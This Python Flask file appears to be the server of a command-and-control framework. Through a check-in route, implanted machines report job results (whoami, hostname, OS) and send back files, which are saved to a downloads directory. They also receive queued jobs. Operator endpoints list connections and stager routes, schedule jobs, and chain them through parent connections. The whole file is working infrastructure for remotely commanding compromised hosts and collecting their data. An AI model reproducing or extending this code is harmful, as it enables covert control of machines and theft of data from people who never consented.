import datetime
import base64
import os

from connect.server import app, api_key, db, generate_id, downloads_directory, socket
from connect.server.database import Routes, Connections, Jobs
from flask import request, jsonify
from datetime import datetime
from sqlalchemy import desc

"""
Check_In Route

This route controls establishing and updating connections. 
"""


def load_route(name):
    return Routes.query.filter(Routes.name == name).one().identifier


@app.route(f"/{load_route('check_in')}", methods=['POST', 'GET'])
def check_in():
    """
    Check_In Route

    The check-in route.py expects a check_in_packet containing the following items.
     - job_results_packet: [job_id, results]
     - check_in_packet : [ [job_results_packet], [job_results_packet], [job_results_packet] ]

    The check-in route.py returns a response_packet containing the following items.
     - job_packet: [job_name, job_arguments]
     - response_packet : {job_id: job_packet, job_id: job_packet}
    """
    try:
        job_packets = request.get_json(force=True)
    except Exception as e:
        print(f'Failed to parse: {request.get_data()} {e}')
        return jsonify("{}")
    uncompleted_jobs = []
    for job_packet in job_packets:
        try:
            job = Jobs.query.filter_by(identifier=job_packet[0]).first()
            job.completed = datetime.now()
            if len(job_packet) > 1:
                emit = None
                if job.type == 1 or job.type == -1:
                    results = base64.b64decode(job_packet[1]).decode('utf-8')
                    job.results = results
                    emit = ('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': results})
                    if job.name == 'whoami':
                        job.connection.username = results
                    if job.name == 'hostname':
                        job.connection.hostname = results
                    if job.name == 'os':
                        job.connection.os = results
                if job.type == 2 or job.type == -2:
                    file_name = f'{generate_id()}.txt'
                    download_path = f'{downloads_directory}{file_name}'
                    emit = ('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': f'Writing results to {download_path}'})
                    try:
                        with open(download_path, 'wb') as fd:
                            fd.write(base64.b64decode(job_packet[1]))
                        job.results = file_name
                    except Exception as e:
                        os.remove(download_path)
                        emit = ('failure', {'banner': f'failed to write results to {download_path} for {job.name} job from {job.connection_id}: {e}.'})
                if job.type > 0:
                    socket.emit(*emit)
            if job.name == 'check_in':
                if job.connection.check_in:
                    time_delta = (datetime.now() - job.connection.check_in)
                    if time_delta.total_seconds() > 29:
                        socket.emit('success', {'banner': f'{job.connection_id} is now connected.', 'results': ''})
                else:
                    socket.emit('success', {'banner': f'{job.connection_id} is now connected.', 'results': ''})
                job.connection.check_in = datetime.now()
                for job in job.connection.jobs:
                    if not job.sent:
                        if job.type > 0:
                            socket.emit('information', {'banner': f'Sent {job.name} job to {job.connection_id}.'})
                        job.sent = datetime.now()
                        uncompleted_jobs.append({"id": str(job.identifier), "name": job.name, "arguments": job.arguments})
            db.session.add(job)
            db.session.commit()
        except Exception as e:
            print(f'Failed to parse job_packet: {job_packet} {e}')
    return jsonify({"job_packet": uncompleted_jobs})


"""
REST API

The following static routes control data flow between the server and operator(s).
"""


def authenticated(data):
    if data:
        return data['api_key'] == api_key
    return False


def serialize(items):
    dictionary = {}
    for item in items:
        dictionary[item.identifier] = item.get_list()
    return dictionary


@app.route("/connections", methods=['POST'])
def connections():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    return jsonify(serialize(Connections.query.order_by(desc(Connections.requested)).all()))


@app.route("/routes", methods=['POST'])
def routes():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    return jsonify(serialize(Routes.query.filter_by(type='stager').all()))


def schedule_job(name, connection, arguments, type):
    if connection.parent_id:
        job = Jobs(name=name, connection=connection, arguments=arguments, type=type)
        db.session.add(job)
        db.session.commit()
        connection_packet = f'{{{job.identifier}:[{job.name},{job.arguments}]}}'
        schedule_job('downstream', connection.parent, connection_packet, 2)
    else:
        job = Jobs(name=name, connection=connection, arguments=arguments, type=type)
        db.session.add(job)
        db.session.commit()


@app.route("/jobs", methods=['POST'])
def jobs():
    data = request.get_json(force=True)
    if not authenticated(data):
        return "Not authenticated"
    if 'name' in data.keys():
        connection = Connections.query.filter_by(identifier=data['connection_id']).first()
        schedule_job(data['name'], connection, data['arguments'], data['type'])
        return jsonify("Job created successfully")
